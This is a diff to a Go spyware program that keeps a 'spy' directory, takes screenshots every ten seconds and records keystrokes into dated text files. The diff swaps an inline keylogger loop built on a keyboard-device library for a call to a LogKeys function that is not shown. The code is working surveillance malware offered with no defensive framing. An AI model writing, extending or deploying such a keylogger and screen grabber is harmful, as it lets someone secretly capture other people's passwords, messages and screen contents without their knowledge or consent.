@@ -1,12 +1,10 @@
 package main
 
 import (
-	"fmt"
 	"image/png"
 	"os"
 	"time"
 
-	"github.com/MarinX/keylogger"
 	"github.com/vova616/screenshot"
 )
 
@@ -77,21 +75,7 @@ func appendIntoFile(filename, content string) {
 }
 
 func main() {
-	devs, err := keylogger.NewDevices()
-
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-
-	for _, val := range devs {
-		fmt.Println("Id->", val.Id, "Device->", val.Name)
-	}
-
-	// Keyboard device.
-	rd := keylogger.NewKeyLogger(devs[4])
-
-	// Make home dir for spy
+	// Create home directory for spy
 	if _, err := os.Stat(spyhome); os.IsNotExist(err) {
 		os.Mkdir(spyhome, 0777)
 	}
@@ -99,17 +83,7 @@ func main() {
 	// Set screen shot interval
 	go intervalScreenShot(10)
 
-	in, err := rd.Read()
-	if err != nil {
-		fmt.Println("Error!", err)
-		return
-	}
-
-	for i := range in {
-		if i.Type == keylogger.EV_KEY {
-			filename := spyhome + "file_" + getCurrentDate() + ".txt"
-			fmt.Println(i.KeyString() + "\n")
-			appendIntoFile(filename, i.KeyString()+"\n")
-		}
-	}
+	filename := spyhome + "file_" + getCurrentDate() + ".txt"
+	LogKeys(filename)
+	os.Exit(0)
 }
